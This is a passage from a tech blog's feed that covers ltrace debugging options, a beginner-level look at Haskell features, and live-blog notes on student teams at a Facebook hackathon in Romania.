14:50:42 __gmpz_clear(0x7fff842299f0, 0x1d02020, 0, 0x129c08be7ca69)= 0
14:50:42 pow(0x3573db8760, 0xffffffff, 0x4044800000000000, 0)= 0x4da9465e5d9d1629
14:50:42 pthread_attr_init(0x7fff84229a00, 213, 0x7fefffffffffffff, 0x7fffffffffffffff)= 0
14:50:42 pthread_attr_setdetachstate(0x7fff84229a00, 0, 0x7fefffffffffffff, 0)= 0
14:50:42 pthread_create(0x7fff84229a40, 0x7fff84229a00, 0x400a60, 0)= 0
14:50:42 pthread_create(0x7fff84229a38, 0x7fff84229a00, 0x400aa8, 0)= 0
14:50:42 pthread_attr_destroy(0x7fff84229a00, 0x7f48e7ec0fb0, 0x7f48e7ec19d0, -1)= 0
14:50:42 pthread_join(0x7f48e86c2700, 0, 0x7f48e7ec19d0, -1)= 0
14:50:42 pthread_join(0x7f48e7ec1700, 0, 0x7f48e86c2700, 0x3574418290)= 0
14:50:42 +++ exited (status 0) +++</code></pre>
<p><code>-tt</code> also displays the microseconds</p>
<pre><code>$ ltrace -tt ./test
14:50:45.465708 __libc_start_main(0x400aeb, 1, 0x7fff83373968, 0x400c60 &lt;unfinished ...&gt;
14:50:45.465942 __gmpz_init_set_ui(0x7fff83373820, 41, 0x7fff83373978, 0x400c60)= 1
14:50:45.466216 __gmpz_pow_ui(0x7fff83373820, 0x7fff83373820, 41, 0x7fff83373820)= 0
14:50:45.466400 __gmpz_clear(0x7fff83373820, 0x192e020, 0, 0x129c08be7ca69)= 0
14:50:45.466584 pow(0x3573db8760, 0xffffffff, 0x4044800000000000, 0)= 0x4da9465e5d9d1629
14:50:45.466764 pthread_attr_init(0x7fff83373830, 213, 0x7fefffffffffffff, 0x7fffffffffffffff)= 0
14:50:45.466932 pthread_attr_setdetachstate(0x7fff83373830, 0, 0x7fefffffffffffff, 0)= 0
14:50:45.467101 pthread_create(0x7fff83373870, 0x7fff83373830, 0x400a60, 0)= 0
14:50:45.467417 pthread_create(0x7fff83373868, 0x7fff83373830, 0x400aa8, 0)= 0
14:50:45.468024 pthread_attr_destroy(0x7fff83373830, 0x7fc1e7ebdfb0, 0x7fc1e7ebe9d0, -1)= 0
14:50:45.468253 pthread_join(0x7fc1e86bf700, 0, 0x7fc1e7ebe9d0, -1)= 0
14:50:45.468480 pthread_join(0x7fc1e7ebe700, 0, 0x7fc1e86bf700, 0x3574418290)= 0
14:50:45.469108 +++ exited (status 0) +++</code></pre>
<p><code>-ttt</code> displays microseconds as above but use the seconds till epoch instead of the actual time.</p>
<pre><code>$ ltrace -ttt ./test
1390074648.833755 __libc_start_main(0x400aeb, 1, 0x7fff5b1c8e28, 0x400c60 &lt;unfinished ...&gt;
1390074648.833981 __gmpz_init_set_ui(0x7fff5b1c8ce0, 41, 0x7fff5b1c8e38, 0x400c60)= 1
1390074648.834289 __gmpz_pow_ui(0x7fff5b1c8ce0, 0x7fff5b1c8ce0, 41, 0x7fff5b1c8ce0)= 0
1390074648.834481 __gmpz_clear(0x7fff5b1c8ce0, 0x1e7c020, 0, 0x129c08be7ca69)= 0
1390074648.834678 pow(0x3573db8760, 0xffffffff, 0x4044800000000000, 0)= 0x4da9465e5d9d1629
1390074648.834858 pthread_attr_init(0x7fff5b1c8cf0, 213, 0x7fefffffffffffff, 0x7fffffffffffffff)= 0
1390074648.835033 pthread_attr_setdetachstate(0x7fff5b1c8cf0, 0, 0x7fefffffffffffff, 0)= 0
1390074648.835242 pthread_create(0x7fff5b1c8d30, 0x7fff5b1c8cf0, 0x400a60, 0)= 0
1390074648.835935 pthread_create(0x7fff5b1c8d28, 0x7fff5b1c8cf0, 0x400aa8, 0)= 0
1390074648.836327 pthread_attr_destroy(0x7fff5b1c8cf0, 0x7fc3da214fb0, 0x7fc3da2159d0, -1)= 0
1390074648.837980 pthread_join(0x7fc3daa16700, 0, 0x7fc3da2159d0, -1)= 0
1390074648.838436 pthread_join(0x7fc3da215700, 0, 0x7fc3daa16700, 0x3574418290)= 0
1390074648.839230 +++ exited (status 0) +++</code></pre>
<p>Also, both tools allow you to time each individual call by using <code>-T</code>:</p>
<pre><code>$ ltrace -T ./test
__libc_start_main(0x400aeb, 1, 0x7fffc4512768, 0x400c60 &lt;unfinished ...&gt;
__gmpz_init_set_ui(0x7fffc4512620, 41, 0x7fffc4512778, 0x400c60)    = 1 &lt;0.000290&gt;
__gmpz_pow_ui(0x7fffc4512620, 0x7fffc4512620, 41, 0x7fffc4512620)   = 0 &lt;0.000167&gt;
__gmpz_clear(0x7fffc4512620, 0x21cc020, 0, 0x129c08be7ca69)         = 0 &lt;0.000142&gt;
pow(0x3573db8760, 0xffffffff, 0x4044800000000000, 0)                = 0x4da9465e5d9d1629 &lt;0.000209&gt;
pthread_attr_init(0x7fffc4512630, 213, 0x7fefffffffffffff, 0x7fffffffffffffff)= 0 &lt;0.000130&gt;
pthread_attr_setdetachstate(0x7fffc4512630, 0, 0x7fefffffffffffff, 0)= 0 &lt;0.000139&gt;
pthread_create(0x7fffc4512670, 0x7fffc4512630, 0x400a60, 0)         = 0 &lt;0.000304&gt;
pthread_create(0x7fffc4512668, 0x7fffc4512630, 0x400aa8, 0)         = 0 &lt;0.000421&gt;
pthread_attr_destroy(0x7fffc4512630, 0x7f09988a1fb0, 0x7f09988a29d0, -1)= 0 &lt;0.000266&gt;
pthread_join(0x7f09990a3700, 0, 0x7f09988a29d0, -1)                 = 0 &lt;0.000181&gt;
pthread_join(0x7f09988a2700, 0, 0x7f09990a3700, 0x3574418290)       = 0 &lt;0.000467&gt;
+++ exited (status 0) +++</code></pre>
<p>Though you can profile applications using <code>ltrace</code> and <code>strace</code>, a much better tool to use is <code>perf</code> which will be presented on a future article.</p>
</section>
<section id="blaming-it-on-the-culprit-line" class="level3">
<h3>Blaming it on the Culprit Line</h3>
<p>It is possible to use <code>ltrace</code> and <code>strace</code> to show you the line numbers of the caller by using the <code>-i</code> flag to get the value of the <code>EIP</code> register and then using <a href="http://linuxmanpages.com/man1/addr2line.1.php" title="addr2line - convert addresses into file names and line numbers"><code>addr2line</code></a> to get the exact line (compile with <code>-g</code>):</p>
<pre><code>$ ltrace -i ./test
...
[0x400bfb] pthread_create(0x7fff0804c998, 0x7fff0804c960, 0x400aa8, 0)= 0
[0x400c1f] pthread_attr_destroy(0x7fff0804c960, 0x7f708d112fb0, 0x7f708d1139d0, -1)= 0
...
[0xffffffffffffffff] +++ exited (status 0) +++

$ addr2line -iCse ./test 0x400c1f
test.c:63</code></pre>
<p>This is useful when your code makes repeated calls to the same subset of functions but only a few of them cause problems.</p>
</section>
<section id="nicer-output" class="level3">
<h3>Nicer Output</h3>
<p>One interesting feature of <code>ltrace</code> is that you can get a nice call tree when functions from one library call other traced functions. For that, you would use the <code>-n</code> option.</p>
<pre><code>$ ltrace -n 3 -L -x &#39;@libgmp.so.*&#39; ./test
__gmpz_init_set_ui@libgmp.so.10(0x7fff7bb2e810, 41, 0x7fff7bb2e968, 0x400c60 &lt;unfinished ...&gt;
   __gmp_default_allocate@libgmp.so.10(8, 41, 0x7fff7bb2e968, 0x400c60)= 0x12b2010
&lt;... __gmpz_init_set_ui resumed&gt; )= 1
__gmpz_pow_ui@libgmp.so.10(0x7fff7bb2e810, 0x7fff7bb2e810, 41, 0x7fff7bb2e810 &lt;unfinished ...&gt;
   __gmpz_n_pow_ui@libgmp.so.10(0x7fff7bb2e810, 0x12b2010, 1, 41 &lt;unfinished ...&gt;
      __gmpz_realloc@libgmp.so.10(0x7fff7bb2e810, 7, 42, 7 &lt;unfinished ...&gt;
         __gmp_default_reallocate@libgmp.so.10(0x12b2010, 8, 56, 7)= 0x12b2010
      &lt;... __gmpz_realloc resumed&gt; )= 0x12b2010
      __gmpn_sqr@libgmp.so.10(0x12b2010, 0x7fff7bb2e720, 2, 48 &lt;unfinished ...&gt;
         __gmpn_sqr_basecase@libgmp.so.10(0x12b2010, 0x7fff7bb2e720, 2, 48)= 0x3562f3ea0787ecff
      &lt;... __gmpn_sqr resumed&gt; )= 0
      __gmpn_mul_1@libgmp.so.10(0x12b2010, 0x12b2010, 3, 0x129c08be7ca69)= 0xca32f2e
   &lt;... __gmpz_n_pow_ui resumed&gt; )= 0
&lt;... __gmpz_pow_ui resumed&gt; )= 0
__gmpz_clear@libgmp.so.10(0x7fff7bb2e810, 0x12b2020, 0, 0x129c08be7ca69 &lt;unfinished ...&gt;
   __gmp_default_free@libgmp.so.10(0x12b2010, 56, 0, 0x129c08be7ca69)= 0
&lt;... __gmpz_clear resumed&gt; )= 0
_fini@libgmp.so.10(0x358cc761f0, 0, 0xffffffff, 0)= 0x358ca5edc4
+++ exited (status 0) +++</code></pre>
<p>If <code>ltrace</code> was compiled with <code>libunwind</code> support then you can also use the <code>-w</code> option to get a backtrace for a specific number of frames around each traced call. If not (like in our case) one can still use the <code>-i</code> way or the <code>-n</code>, depending on what he is interested in.</p>
</section>
<section id="conclusions" class="level3">
<h3>Conclusions</h3>
<p>Though very rarely used, <code>ltrace</code> is a nice program to have in your toolbox. It will greatly help you in those hard to debug cases caused by undocumented behaviors of third-party libraries.</p>
<p>Notice that <code>ltrace</code> has most of the bugs of <code>strace</code>:</p>
<ol type="1">
<li>a program with <code>setuid</code> doesn’t have <code>euid</code> privileges while being traced</li>
<li>a program is slow while being traced</li>
<li>the <code>-i</code> support is weak</li>
</ol>
<p>Next article on this series will present tools for profiling applications and solving timing bugs.</p>
</section>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Sat, 18 Jan 2014 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/ltrace.html</guid>
</item>
<item>
    <title>A superficial exploration of Haskell - part 1</title>
    <link>http://techblog.rosedu.org/haskell-part1.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/haskell-part1.html" title="A superficial exploration of Haskell - part 1">A superficial exploration of Haskell - part 1</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on January  7, 2014</span>
      by
      <span class="author">Dan Șerban</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/haskell.html">haskell</a></span>
      </span>

      <p>This series of blog posts is aimed at experienced programmers who have heard that Haskell is an interesting programming language, but have not had the chance to invest any time in researching it.</p>
<p>In this series I am going to highlight a few remarkable things at a high level, while glossing over some implementation details that would take too long to explain properly. Therefore, expect a lot of “here’s a practical application of Haskell and here’s some sample code, but don’t ask to see the gory details” hand-waving.</p>
<p>For the purposes of this series, I will simply assume that it’s easy for the experienced reader to jump into a new imperative programming language after a few hours or days of becoming familiar with its syntax. And I’ll start with an example that illustrates how you have to adopt a completely different mindset when you start learning Haskell.</p>
<p>Part 1 of this series covers:</p>
<ul>
<li>Mutability</li>
<li>Upside Down Maps</li>
<li>Tokenizing Kernel Code</li>
</ul>
<p><strong>Before you ask:</strong> All the Haskell snippets I’m showing here consist of GHCi interactive console sessions. I have configured a custom prompt for myself, by placing the line <code>:set prompt &quot;λ: &quot;</code> in GHCi’s configuration file <code>~/.ghc/ghci.conf</code>. The prompt is going to <a href="http://www.haskell.org/ghc/docs/7.6.2/html/users_guide/interactive-evaluation.html">look different</a> if you’re just starting out with a freshly installed copy of Haskell.</p>
<section id="mutability" class="level3">
<h3>Mutability</h3>
<p>To start with, here’s a Python code sample, cut and pasted from a Python 2.7 REPL (interactive console session):</p>
<pre class="sourceCode python"><code class="sourceCode python">&gt;&gt;&gt; x = <span class="dv">1</span>
&gt;&gt;&gt; x = x + <span class="dv">1</span>
&gt;&gt;&gt; x
<span class="dv">2</span>
&gt;&gt;&gt;</code></pre>
<p>Nothing could be simpler!</p>
<p>OK then. Time to port this snippet of code over to Haskell. I’m just going to go with the flow and naively assume – just as many newcomers to Haskell would – that porting Python code is a direct 1-to-1 syntactic translation, in other words, an easy, straightforward thing to do.</p>
<p>The following is what happens in the Haskell REPL (called GHCi). By the way, here we have to prepend the keyword <code>let</code> - it’s the law of the land in GHCi:</p>
<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: <span class="kw">let</span> x <span class="fu">=</span> <span class="dv">1</span>
λ: <span class="kw">let</span> x <span class="fu">=</span> x <span class="fu">+</span> <span class="dv">1</span>
λ: x
<span class="fu">^</span><span class="dt">CInterrupted</span><span class="fu">.</span>
λ:</code></pre>
<p>Huh? What just happened? I was expecting Haskell to compute the value 2. It took forever for the GHCi interactive console to evaluate <code>x</code>, so I got bored and pressed <code>Ctrl-C</code>. What’s happening? Explain this to me.</p>
<p>Well, as one Reddit commenter once observed, this is just one of the many things Haskell does to haze you during your initiation.</p>
<p>What you’re actually doing is giving Haskell a puzzle (<code>x = x + 1</code>) and saying “Go find me a solution”. Mathematically speaking, there are only 2 possible solutions to that puzzle: <span class="math">\(\infty\)</span> and <span class="math">\(- \infty\)</span>. So when you saw it hang, Haskell wasn’t merely taking its time – for no good reason – before giving you back the value 2. Instead, Haskell’s runtime was trying its hardest to give you a correct result by taking every integer value it could think of, one by one, and checking whether it was equal to its successor.</p>
<p>Just to be clear, there is a way to emulate the behavior of the Python snippet we saw above, and the Haskell code for doing that looks like this:</p>
<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: <span class="kw">let</span> x <span class="fu">=</span> <span class="dv">1</span>
λ: x <span class="ot">&lt;-</span> return <span class="fu">$</span> x <span class="fu">+</span> <span class="dv">1</span>
λ: x
<span class="dv">2</span>
λ:</code></pre>
<p>As you can see, the syntax is much more verbose (and uglier) than in Python, and for good reason – in Haskell, you are strongly discouraged from using variables and mutation as the primary means of expressing algorithms.</p>
<p>Haskell is divided in two major parts: a crystal palace of unspeakable beauty and <em>mathematical purity</em>, and an imperative ghetto for doing <em>I/O</em> and dealing with <em>mutation</em>. The equal sign in <code>x = x + 1</code> lives in the beautiful palace and symbolizes mathematical unification, while the construct <code>&lt;- return $</code> lives in the ghetto and means “evaluate the right hand side and shove the result into the identifier on the left hand side, thus overwriting what was there beforehand, in true imperative style”.</p>
</section>
<section id="reverse-map-upside-down-map-you-decide" class="level3">
<h3>Reverse Map? Upside Down Map? You decide</h3>
<p>OK, for the next segment I’m going to assume that your beloved programming language of choice has a construct called <code>map</code>, and that you know how to use it.</p>
<p>We start again with some Python code. While Python does indeed offer a higher-order function called <code>map</code>, it’s much more common for experienced Python developers to prefer using a list comprehension, like this:</p>
<pre class="sourceCode Python"><code class="sourceCode python">&gt;&gt;&gt; <span class="dt">list</span> = <span class="dt">range</span>(<span class="dv">20</span>,<span class="dv">31</span>)
&gt;&gt;&gt; <span class="dt">list</span>
[<span class="dv">20</span>, <span class="dv">21</span>, <span class="dv">22</span>, <span class="dv">23</span>, <span class="dv">24</span>, <span class="dv">25</span>, <span class="dv">26</span>, <span class="dv">27</span>, <span class="dv">28</span>, <span class="dv">29</span>, <span class="dv">30</span>]
&gt;&gt;&gt; [ x + <span class="dv">1</span> <span class="kw">for</span> x in <span class="dt">list</span> ]
[<span class="dv">21</span>, <span class="dv">22</span>, <span class="dv">23</span>, <span class="dv">24</span>, <span class="dv">25</span>, <span class="dv">26</span>, <span class="dv">27</span>, <span class="dv">28</span>, <span class="dv">29</span>, <span class="dv">30</span>, <span class="dv">31</span>]
&gt;&gt;&gt;</code></pre>
<p>Nothing new or earth-shattering - I would hope - so here’s the Haskell equivalent before we jump into the interesting stuff:</p>
<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: <span class="kw">let</span> list <span class="fu">=</span> [<span class="dv">20</span><span class="fu">..</span><span class="dv">30</span>]
λ: list
[<span class="dv">20</span>,<span class="dv">21</span>,<span class="dv">22</span>,<span class="dv">23</span>,<span class="dv">24</span>,<span class="dv">25</span>,<span class="dv">26</span>,<span class="dv">27</span>,<span class="dv">28</span>,<span class="dv">29</span>,<span class="dv">30</span>]
λ: map (<span class="fu">+</span><span class="dv">1</span>) list
[<span class="dv">21</span>,<span class="dv">22</span>,<span class="dv">23</span>,<span class="dv">24</span>,<span class="dv">25</span>,<span class="dv">26</span>,<span class="dv">27</span>,<span class="dv">28</span>,<span class="dv">29</span>,<span class="dv">30</span>,<span class="dv">31</span>]
λ:</code></pre>
<p>So the basic idea I’m getting at here is that in the beginning we have:</p>
<ul>
<li>one single operation (compute an integer’s successor)</li>
<li>a list of integer values</li>
</ul>
<p><strong>Now for the interesting part.</strong></p>
<p>Let’s take those bullet points above and turn them upside down, such that in the beginning we have:</p>
<ul>
<li>one single integer value</li>
<li>a list of unary integer-to-integer operations</li>
</ul>
<p>Python can still deal with this situation fairly well, since Python’s functions are first-class values (you can place several of them inside of a list). But the Python code wouldn’t be as concise or expressive as the Haskell equivalent, shown here:</p>
<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: <span class="kw">let</span> function_list_1 <span class="fu">=</span> [(<span class="fu">+</span><span class="dv">2</span>),(<span class="fu">*</span><span class="dv">3</span>),(<span class="fu">^</span><span class="dv">2</span>)]
λ: <span class="kw">let</span> function_list_2 <span class="fu">=</span> [(<span class="fu">*</span><span class="dv">5</span>),(<span class="fu">+</span><span class="dv">7</span>),(<span class="fu">*</span><span class="dv">4</span>),(subtract <span class="dv">10</span>)]
λ: <span class="kw">let</span> i <span class="fu">=</span> <span class="dv">12</span>
λ: <span class="kw">import </span><span class="dt">Control.Applicative</span>
λ: function_list_1 <span class="fu">&lt;*&gt;</span> [i]
[<span class="dv">14</span>,<span class="dv">36</span>,<span class="dv">144</span>]
λ: function_list_2 <span class="fu">&lt;*&gt;</span> [i]
[<span class="dv">60</span>,<span class="dv">19</span>,<span class="dv">48</span>,<span class="dv">2</span>]
λ:</code></pre>
<p><strong>Side note:</strong> Due to brevity concerns, it is not practical to go into a detailed explanation of the <code>&lt;*&gt;</code> operator in <code>Control.Applicative</code> (a module in Haskell’s standard library). That is a topic for another blog post. The point here was to show how concisely you can express non-trivial computations with Haskell.</p>
<p><strong>Fun fact:</strong> implementing the “upside-down map” described above was recently a requirement for admittance into <a href="http://webdev.rosedu.org/">WebDev</a> (an extracurricular course organized by ROSEdu). Candidates sent us solutions they had written in various programming languages, with varying degrees of conciseness. We found that the most verbose implementations were predominantly Java-based.</p>
</section>
<section id="lets-tokenize-some-kernel-code" class="level3">
<h3>Let’s tokenize some kernel code</h3>
<p>For the next segment I’ll just grab a <a href="https://github.com/torvalds/linux/blob/master/kernel/sched/fair.c#L507">snippet of code from the Linux kernel</a> and demonstrate how concisely you can express a tokenizer for it in Haskell.</p>
<p>The code for Linux’s completely fair scheduler is stored in a file called <code>fair.c</code>; I’ll just grab a small function from it (function <code>__enqueue_entity</code>, which starts at line 507) and store it locally in a file called <code>enqueue_entity.c</code>.</p>
<p>Here’s what I do subsequently, step by step:</p>
<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: sample_cfs_code <span class="ot">&lt;-</span> readFile <span class="st">&quot;enqueue_entity.c&quot;</span>
λ:</code></pre>
<p>I just slurped the contents of the file into <code>sample_cfs_code</code>. This is our raw material, let’s look at it:</p>
<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: sample_cfs_code
<span class="st">&quot;static void __enqueue_entity(struct cfs_rq *cfs_rq, struct sched_entity *se)\n{\n        struct rb_node **link = &amp;cfs_rq-&gt;tasks_timeline.rb_node;\n        struct rb_node *parent = NULL;\n        struct sched_entity *entry;\n        int leftmost = 1;\n        while (*link) {\n                parent = *link;\n                entry = rb_entry(parent, struct sched_entity, run_node);\n                if (entity_before(se, entry)) {\n                        link = &amp;parent-&gt;rb_left;\n                } else {\n                        link = &amp;parent-&gt;rb_right;\n                        leftmost = 0;\n                }\n        }\n        if (leftmost)\n                cfs_rq-&gt;rb_leftmost = &amp;se-&gt;run_node;\n\n        rb_link_node(&amp;se-&gt;run_node, parent, link);\n        rb_insert_color(&amp;se-&gt;run_node, &amp;cfs_rq-&gt;tasks_timeline);\n}\n\n&quot;</span>
λ:</code></pre>
<p>We now define our tokenizing function in Haskell (I trust you will appreciate how concise it is):</p>
<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: <span class="kw">import </span><span class="dt">Data.List</span>
λ: <span class="kw">let</span> tokenize_this <span class="fu">=</span> unfoldr (\x <span class="ot">-&gt;</span> <span class="kw">case</span> lex x <span class="kw">of</span> [(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)] <span class="ot">-&gt;</span> <span class="dt">Nothing</span>; x<span class="fu">:</span>_ <span class="ot">-&gt;</span> <span class="dt">Just</span> x)
λ:</code></pre>
<p>The most interesting keyword here is <code>lex</code>, which is a function that is defined in Haskell’s standard library as part of the <code>GHC.Read</code> module. The <code>unfoldr</code> function also deserves some explanation, but just as before, it wouldn’t be practical to go into much detail here.</p>
<p>So far, so good. Let’s apply our tokenizing function to the C code:</p>
<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: <span class="kw">let</span> tokenized_cfs_code <span class="fu">=</span> tokenize_this sample_cfs_code
λ:</code></pre>
<p>Finally, let’s view the resulting stream of tokens:</p>
<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: mapM_ print tokenized_cfs_code
<span class="st">&quot;static&quot;</span>
<span class="st">&quot;void&quot;</span>
<span class="st">&quot;__enqueue_entity&quot;</span>
<span class="st">&quot;(&quot;</span>
<span class="st">&quot;struct&quot;</span>
<span class="st">&quot;cfs_rq&quot;</span>
<span class="st">&quot;*&quot;</span>
<span class="st">&quot;cfs_rq&quot;</span>
<span class="st">&quot;,&quot;</span>
<span class="st">&quot;struct&quot;</span>
<span class="st">&quot;sched_entity&quot;</span>
<span class="st">&quot;*&quot;</span>
<span class="st">&quot;se&quot;</span>
<span class="st">&quot;)&quot;</span>
<span class="st">&quot;{&quot;</span>
<span class="st">&quot;struct&quot;</span>
<span class="st">&quot;rb_node&quot;</span>
<span class="st">&quot;**&quot;</span>
<span class="st">&quot;link&quot;</span>
<span class="st">&quot;=&quot;</span>
<span class="st">&quot;&amp;&quot;</span>
<span class="st">&quot;cfs_rq&quot;</span>
<span class="st">&quot;-&gt;&quot;</span>
[ <span class="fu">...</span> many more tokens <span class="dt">I&#39;m</span> not showing here <span class="fu">...</span> ]
<span class="st">&quot;rb_insert_color&quot;</span>
<span class="st">&quot;(&quot;</span>
<span class="st">&quot;&amp;&quot;</span>
<span class="st">&quot;se&quot;</span>
<span class="st">&quot;-&gt;&quot;</span>
<span class="st">&quot;run_node&quot;</span>
<span class="st">&quot;,&quot;</span>
<span class="st">&quot;&amp;&quot;</span>
<span class="st">&quot;cfs_rq&quot;</span>
<span class="st">&quot;-&gt;&quot;</span>
<span class="st">&quot;tasks_timeline&quot;</span>
<span class="st">&quot;)&quot;</span>
<span class="st">&quot;;&quot;</span>
<span class="st">&quot;}&quot;</span>
λ:</code></pre>
<p>You can use this approach to help your language design efforts, if you plan on inventing your own DSL, or even your own general-purpose programming language. Once your source code is tokenized, you can now parse the stream of tokens into the target Haskell data structures using a technique called combinator parsing, which is where the Haskell programming language really shines.</p>
</section>
<section id="end-of-part-1" class="level3">
<h3>End of part 1</h3>
<p>That’s it for part 1 – there will be more to come.</p>
<p>If you’re interested in picking up Haskell, there are a number of very good free online resources (<a href="https://www.fpcomplete.com/school">1</a>, <a href="http://learnyouahaskell.com/">2</a>, <a href="http://book.realworldhaskell.org/">3</a>), as well as classes and workshops held in various locations.</p>
<p>Speaking of Haskell classes and workshops, allow me to draw your attention to a project called <a href="http://lambda.rosedu.org/#english">lambda.rosedu.org</a>, which is an instructor-led, in-depth, hands-on workshop on functional programming centered around Haskell, Scala and Clojure. The workshop is free of charge, but the standards for admittance are fairly high (you will need to solve a few programming as well as logic problems). The workshop will be hosted by ROSEdu at the department for Computer Science of the POLITEHNICA University of Bucharest some time during the summer of 2014. The topics I glossed over – due to brevity concerns – in this blog post will be covered in depth during the workshop.</p>
</section>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Tue, 07 Jan 2014 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/haskell-part1.html</guid>
</item>
<item>
    <title>Facebook Hackathon Live Blogging</title>
    <link>http://techblog.rosedu.org/facebook-hackathon-live-blogging.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/facebook-hackathon-live-blogging.html" title="Facebook Hackathon Live Blogging">Facebook Hackathon Live Blogging</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on October 19, 2013</span>
      by
      <span class="author">Alex Palcuie and Marius Ungureanu</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/facebook.html">facebook</a>, <a href="/tags/hackathon.html">hackathon</a>, <a href="/tags/live.html">live</a>, <a href="/tags/blogging.html">blogging</a>, <a href="/tags/coders.html">coders</a></span>
      </span>

      <div class="right">
<img style="float:right" width="300" height="300" src="http://distilleryimage10.ak.instagram.com/b88daa3e38a911e3893622000a1fcd0b_7.jpg">
</div>
<section id="pm" class="level4">
<h4>3:30PM</h4>
<p>Ladies and gentlemen, fast hackers and coder perfectionists, web developers and mobile app creators, we present you the first edition of the Facebook hackathon in Romania. Organized by your favorite open-source community ROSEdu, the volunteers have been busy all morning preparing the workspace for the 15 participating teams. We have pizza, beer and a mountain of bean bags for people who <em>move fast and break things</em>.</p>
<div style="clear:both;">

</div>
</section>
<section id="pm-1" class="level4">
<h4>3:30PM</h4>
<p>People have started their IDEs (or text editors for more hardcore people) and started installing their gems (Ruby guy here sorry). After a quick intro from the organizers about the rules, the Facebook engineers presented their skills and their expectations: it’s fun to code, but it’s awesome <strong>to ship</strong>. So happy shipping hackers!</p>
<div class="center">
<img width="600" height="400" src="https://fbcdn-sphotos-g-a.akamaihd.net/hphotos-ak-ash3/1381306_602864479775589_1298026562_n.jpg">
</div>
</section>
<section id="pm-2" class="level4">
<h4>5:30PM</h4>
<p>A brief pause and all the keyboard presses have stopped. The Facebook representatives have given out a random prize! One Facebook T-shirt. Congratulations to Andrei Duma! People are now back to coding and making their ideas come to life: <strong>done is better than perfect</strong>.</p>
<div class="center">
<img width="600" height="400" src="/images/facebook-hackathon/premii_facebook.jpg">
</div>
</section>
<section id="first-team" class="level4">
<h4>First team</h4>
<p>Only 4 hours in the event! We have interviewed some of the participants and they’re coding, designing and implementing their application basis! The first team we interviewed is <a href="https://github.com/rosedu/3_awesome_guyes_and_a_llama">3_awesome_guys_and_a_llama</a>. These students from the University “Politehnica” of Bucharest are writing an Event Planner. From what they told us, it’s an application which tries to help people organize events for them and their friends for their night out. It’s more focused on location, than being focused on time, so they can make it a planned drink-up or dance-off. They integrate it with the Facebook Places API and would like to have bars, clubs and restaurants use their app so people can make reservations. As technology stack, they have Python on top of Google App Engine. One of the devs said that he learned about it on a <a href="https://www.udacity.com/course/cs253">Udacity course</a> which I recommend it to you. They also plan to use Twitter’s Bootstrap library because they do not have enough frontend experience.</p>
<div class="center">
<img width="600" height="400" src="/images/facebook-hackathon/two_guys_llama.JPG">
</div>
</section>
<section id="be-green-recycle" class="level4">
<h4>Be green, recycle</h4>
<p>You are a human, walking down and you see a big pile of garbage. It’s a scenario common here in Romania. But what if you have an app for cleaning it? That’s what <a href="https://github.com/rosedu/sudoRecycle">sudoRecycle</a> is trying to do with their Android idea. You see the junk, take a photo, tag it with the GPS location and send it to their servers. Using their backend written in PHP, they will send teams of robots that will clean the area. Because we human beings are really lazy, they plan to use the Facebook API for gamification, so you could level up in cleaning the world.</p>
<div class="center">
<img width="600" height="400" src="/images/facebook-hackathon/sudo_recycle.JPG">
</div>
</section>
<section id="explore-the-underground" class="level4">
<h4>Explore the underground</h4>
<p>We’ve all endured the lack of knowledge of moving around Bucharest, if we haven’t lived here. But <a href="https://github.com/rosedu/Dark_side_of_the_moon">dark_side_of_the_moon</a> is going to remedy this with their offline mobile subway connection app. You want to get from X to Y using the shortest route. It also wants to tell you what ground-level public transportation is there and what you can visit. Furthermore they want it to tell your friends where you’ve been after you used its functionality to check-in at your destination. Under the hood, it’s using Android 4.0+ API and they want to integrate with the Facebook API to see the places your friends have visited. The coolest feature they want to code will tell you when the next tube will arrive.</p>
<div class="center">
<img width="600" height="400" src="/images/facebook-hackathon/pink_floyd.jpg">
</div>
</section>
<section id="grails" class="level4">
<h4>GRails</h4>
<p>Did you know that in the year 2013, if you apply to MIT, you must send the papers by fax or postal mail? And after you send them, a person will manually go through them and tell you that the papers have arrived? Or if you get into a university you must write 6 papers with about 60% redundant information? That’s what <a href="https://github.com/rosedu/GRails">GRails</a>, the only team made entirely of girls, is trying to solve, fighting bureaucracy with Rails 4. Now with 100% less paper involved!</p>
<div class="center">
<img width="600" height="400" src="/images/facebook-hackathon/grails.jpg">
</div>
</section>
<section id="hiking" class="level4">
<h4>Hiking</h4>
<p>Everybody knows that Romania has some of the best hiking routes, beautiful views and mysterious mountains. And who doesn’t want to know what trips you can make in the wild nature? Well, you can now check out a map and see what is available for adventurers! The map also shows you elevation, so you know if it’s a long road and also an abrupt road. A Django platform by <a href="https://github.com/rosedu/saltaretii">saltaretii</a> should be enough to support this paradise for nature’s explorers!</p>
<div class="center">
<img width="600" height="400" src="/images/facebook-hackathon/saltaretii.jpg">
</div>
</section>
<section id="i-want-to-ride-my-bicycle-i-want-to-ride-my-bike" class="level4">
<h4>I want to ride my bicycle, I want to ride my bike</h4>
